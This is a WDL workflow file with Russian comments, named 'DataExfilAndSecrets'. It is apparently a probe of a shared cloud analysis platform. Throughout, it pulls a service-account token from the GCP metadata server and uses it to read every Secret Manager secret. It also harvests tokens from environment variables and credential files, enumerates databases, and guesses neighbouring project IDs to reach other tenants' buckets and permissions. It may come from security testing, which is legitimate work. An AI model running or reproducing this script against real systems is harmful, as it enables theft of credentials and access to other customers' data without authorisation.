version 1.0

workflow DataExfilAndSecrets {
    call SecretDiscovery
    call CrossTenantAccess
}

# Ищем секреты везде
task SecretDiscovery {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR: SECRET DISCOVERY" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
        PROJECT=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null)

        # 1. Secret Manager — list all secrets
        echo "=== 1. Secret Manager: List ===" >> results.txt
        curl -s \
          "https://secretmanager.googleapis.com/v1/projects/$PROJECT/secrets" \
          -H "Authorization: Bearer $TOKEN" 2>&1 >> results.txt
        echo "" >> results.txt

        # Try to access each secret's latest version
        echo "=== Secret Manager: Access Versions ===" >> results.txt
        for secret in $(curl -s \
          "https://secretmanager.googleapis.com/v1/projects/$PROJECT/secrets" \
          -H "Authorization: Bearer $TOKEN" 2>/dev/null | \
          python3 -c "import sys,json; [print(s['name'].split('/')[-1]) for s in json.load(sys.stdin).get('secrets',[])]" 2>/dev/null); do
            echo "--- Secret: $secret ---" >> results.txt
            curl -s \
              "https://secretmanager.googleapis.com/v1/projects/$PROJECT/secrets/$secret/versions/latest:access" \
              -H "Authorization: Bearer $TOKEN" 2>&1 >> results.txt
            echo "" >> results.txt
        done

        # 2. Environment variables (might have secrets)
        echo "=== 2. Env vars with secrets ===" >> results.txt
        env | grep -iE "(key|secret|token|pass|auth|cred|api)" 2>&1 >> results.txt
        echo "" >> results.txt

        # 3. Files that might contain secrets
        echo "=== 3. Secret files ===" >> results.txt
        find / -maxdepth 4 -name "*.json" -o -name "*.key" -o -name "*.pem" -o -name "*.env" -o -name ".env*" -o -name "credentials*" 2>/dev/null | head -30 >> results.txt
        echo "" >> results.txt

        # Read potential secret files
        for f in /etc/google/auth/application_default_credentials.json \
                 /root/.config/gcloud/application_default_credentials.json \
                 /root/.config/gcloud/credentials.db \
                 /home/*/.config/gcloud/application_default_credentials.json; do
            if [ -f "$f" ]; then
                echo "--- $f ---" >> results.txt
                cat "$f" 2>&1 | head -20 >> results.txt
                echo "" >> results.txt
            fi
        done

        # 4. BigQuery — might have sensitive data
        echo "=== 4. BigQuery Datasets ===" >> results.txt
        curl -s \
          "https://bigquery.googleapis.com/bigquery/v2/projects/$PROJECT/datasets" \
          -H "Authorization: Bearer $TOKEN" 2>&1 >> results.txt
        echo "" >> results.txt

        # List tables in each dataset
        for ds in $(curl -s \
          "https://bigquery.googleapis.com/bigquery/v2/projects/$PROJECT/datasets" \
          -H "Authorization: Bearer $TOKEN" 2>/dev/null | \
          python3 -c "import sys,json; [print(d['datasetReference']['datasetId']) for d in json.load(sys.stdin).get('datasets',[])]" 2>/dev/null); do
            echo "--- Tables in $ds ---" >> results.txt
            curl -s \
              "https://bigquery.googleapis.com/bigquery/v2/projects/$PROJECT/datasets/$ds/tables" \
              -H "Authorization: Bearer $TOKEN" 2>&1 | head -50 >> results.txt
            echo "" >> results.txt
        done

        # 5. Firestore/Datastore
        echo "=== 5. Firestore ===" >> results.txt
        curl -s \
          "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -50 >> results.txt
        echo "" >> results.txt

        # 6. Cloud SQL instances
        echo "=== 6. Cloud SQL ===" >> results.txt
        curl -s \
          "https://sqladmin.googleapis.com/v1/projects/$PROJECT/instances" \
          -H "Authorization: Bearer $TOKEN" 2>&1 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}

# Проверяем cross-tenant — можем ли мы получить данные другого воркспейса
task CrossTenantAccess {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR: CROSS-TENANT / CROSS-WORKSPACE" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
        PROJECT=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null)

        # 1. Try to list ALL projects (org level)
        echo "=== 1. All projects in org ===" >> results.txt
        curl -s \
          "https://cloudresourcemanager.googleapis.com/v1/projects" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -100 >> results.txt
        echo "" >> results.txt

        # 2. Try to list folders
        echo "=== 2. Org Folders ===" >> results.txt
        curl -s \
          "https://cloudresourcemanager.googleapis.com/v2/folders?parent=organizations/-" \
          -H "Authorization: Bearer $TOKEN" 2>&1 >> results.txt
        echo "" >> results.txt

        # 3. Try to access other workspace projects (common naming)
        echo "=== 3. Cross-project access ===" >> results.txt
        PROJECT_PREFIX=$(echo "$PROJECT" | sed 's/-[0-9]*$//')
        for suffix in 3013 3015 3016 3017 3018 3019 3020 1000 2000; do
            TARGET="${PROJECT_PREFIX}-${suffix}"
            echo "--- $TARGET ---" >> results.txt
            code=$(curl -s -o /tmp/proj_resp.txt -w "%{http_code}" \
              "https://cloudresourcemanager.googleapis.com/v1/projects/$TARGET" \
              -H "Authorization: Bearer $TOKEN" 2>/dev/null)
            echo "HTTP: $code" >> results.txt
            if [ "$code" = "200" ]; then
                cat /tmp/proj_resp.txt >> results.txt
                echo "" >> results.txt
                # Try to list buckets in that project
                echo "Buckets:" >> results.txt
                curl -s \
                  "https://storage.googleapis.com/storage/v1/b?project=$TARGET" \
                  -H "Authorization: Bearer $TOKEN" 2>&1 | head -30 >> results.txt
            fi
            echo "" >> results.txt
        done

        # 4. Check if SA has org-level roles
        echo "=== 4. Org-level permissions ===" >> results.txt
        curl -s -X POST \
          "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:testIamPermissions" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{
            "permissions": [
              "resourcemanager.organizations.get",
              "resourcemanager.organizations.getIamPolicy",
              "resourcemanager.folders.list",
              "resourcemanager.folders.get",
              "resourcemanager.projects.list",
              "billing.accounts.list",
              "billing.accounts.get"
            ]
          }' 2>&1 >> results.txt
        echo "" >> results.txt

        # 5. GCR — check for images from other projects
        echo "=== 5. Container Registry (cross-project) ===" >> results.txt
        curl -s \
          "https://gcr.io/v2/_catalog" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -50 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}
